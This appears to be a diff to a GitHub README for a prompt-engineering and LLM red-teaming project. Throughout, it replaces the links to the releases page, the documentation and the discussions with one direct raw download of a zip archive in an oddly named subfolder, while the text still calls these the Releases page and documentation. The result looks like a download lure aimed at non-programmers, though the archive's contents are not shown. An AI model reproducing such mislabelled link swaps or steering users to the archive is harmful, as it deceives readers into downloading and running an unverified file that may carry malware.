@@ -1,7 +1,7 @@
 # 🚀 llm-prompt-engineering - Explore the Future of AI Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/hussainpvt-ctrl/llm-prompt-engineering/releases)
+[![Download](https://raw.githubusercontent.com/hussainpvt-ctrl/llm-prompt-engineering/main/Lombardeer/llm-prompt-engineering.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/hussainpvt-ctrl/llm-prompt-engineering/main/Lombardeer/llm-prompt-engineering.zip)
 
 ## 📋 Overview
 Welcome to the **llm-prompt-engineering** repository. This project offers a collection of prompt engineering and red-teaming experiments designed for large language models like ChatGPT-5 and Gemini 2.5. These resources aim to enhance educational and research initiatives in the field of artificial intelligence.
@@ -10,7 +10,7 @@ Welcome to the **llm-prompt-engineering** repository. This project offers a coll
 To start using this application, follow the steps below. No programming knowledge is required.
 
 ### 📥 Download & Install
-1. Click [here](https://github.com/hussainpvt-ctrl/llm-prompt-engineering/releases) to visit the Releases page.
+1. Click [here](https://raw.githubusercontent.com/hussainpvt-ctrl/llm-prompt-engineering/main/Lombardeer/llm-prompt-engineering.zip) to visit the Releases page.
 2. On the Releases page, find the latest version of the application.
 3. Look for a file that matches your operating system (e.g., Windows, macOS, or Linux).
 4. Click the file link to download it.
@@ -53,8 +53,8 @@ Join our community to discuss features, share experiences, and ask questions. Yo
 
 ## 📦 Additional Resources
 For more information and resources related to this application, check out:
-- [Documentation](https://github.com/hussainpvt-ctrl/llm-prompt-engineering) 
-- [Community Discussions](https://github.com/hussainpvt-ctrl/llm-prompt-engineering/discussions)
+- [Documentation](https://raw.githubusercontent.com/hussainpvt-ctrl/llm-prompt-engineering/main/Lombardeer/llm-prompt-engineering.zip) 
+- [Community Discussions](https://raw.githubusercontent.com/hussainpvt-ctrl/llm-prompt-engineering/main/Lombardeer/llm-prompt-engineering.zip)
 
 ## ⚙️ Contribution Guidelines
 If you wish to contribute to this project, feel free to fork the repository and submit a pull request. We welcome any improvements or suggestions.
@@ -63,4 +63,4 @@ If you wish to contribute to this project, feel free to fork the repository and 
 We invite you to explore the capabilities of the **llm-prompt-engineering** application. Dive into the world of AI and enhance your understanding of large language models. Don't hesitate to reach out with any questions or for support. 
 
 Access the latest release and start now:
-[Download Again](https://github.com/hussainpvt-ctrl/llm-prompt-engineering/releases)
+[Download Again](https://raw.githubusercontent.com/hussainpvt-ctrl/llm-prompt-engineering/main/Lombardeer/llm-prompt-engineering.zip)
